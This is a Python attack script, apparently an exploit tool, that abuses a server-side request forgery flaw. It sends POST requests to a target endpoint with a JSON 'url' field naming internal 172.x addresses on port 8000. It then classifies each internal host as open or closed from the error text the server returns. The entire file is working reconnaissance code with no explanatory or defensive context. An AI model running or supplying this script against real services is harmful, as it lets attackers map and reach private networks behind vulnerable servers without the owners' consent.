#!/usr/bin/env python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout (in seconds)', required=False, default=3)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()

baseurl = args.target

base_ip = "http://172.{two}.{three}.1"
timeout = float(args.timeout)

for y in range(16,256):
    for x in range(250,256):
        host = base_ip.format(two=int(y), three=int(x))
        print("Trying host: {host}".format(host=host))
        p = 8000
        
        try:
            r = requests.post(url=baseurl, json={"url":"{host}:8000".format(host=host)}, timeout=timeout)

            if args.verbose:
                print("\t{port:0} \t {msg}".format(port=int(p), msg=r.text))
            if "Request failed with status code 404" in r.text:
                print("\t{port:0} \t OPEN - returned 404".format(port=int(p)))
            elif "You don't have permission to access this." in r.text:
                print("\t{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))
            elif "Parse Error:" in r.text:
                print("\t{port:0} \t ???? - returned parse error, potentially open non-http".format(port=int(p)))
            elif "socket hang up" in r.text:
                print("\t{port:0} \t OPEN - socket hang up, likely non-http".format(port=int(p)))
        except requests.exceptions.Timeout:
            print("\t{port:0} \t timed out".format(port=int(p)))

 